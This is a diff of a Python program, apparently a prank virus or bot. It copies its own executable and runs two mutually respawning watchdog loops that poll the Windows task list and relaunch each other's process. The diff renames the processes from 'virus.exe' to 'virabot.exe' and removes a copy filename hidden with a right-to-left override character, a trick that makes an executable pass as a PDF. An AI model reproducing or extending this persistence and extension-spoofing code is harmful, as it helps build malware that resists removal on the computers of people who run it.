@@ -49,7 +49,7 @@ def runw():
     root.mainloop()
 
 def copy():
-    file_path = Path("refl‮ｆdp.exe")
+    file_path = Path("virabotcopy.exe")
     if file_path.exists():
         file_path.unlink()
     current_file = os.path.abspath(sys.argv[0])
@@ -65,9 +65,9 @@ if __name__ == '__main__':
     if len(sys.argv) > 1:
         while True:
             output = subprocess.run(['tasklist'], shell=True, capture_output=True).stdout
-            c = str(output).find('virus.exe')
+            c = str(output).find('virabot.exe')
             if c == -1:
-                subprocess.Popen('virus.exe')
+                subprocess.Popen('virabot.exe')
     else:
         copy = copy()
         t1 = threading.Thread(target=runw)
@@ -76,6 +76,6 @@ if __name__ == '__main__':
 
         while True:
             output = subprocess.run(['tasklist'], shell=True, capture_output=True).stdout
-            c = str(output).find('viruscopy.exe')
+            c = str(output).find('virabotcopy.exe')
             if c == -1:
-                subprocess.Popen([copy, 'viruscopy'])
+                subprocess.Popen([copy, 'virabotcopy'])
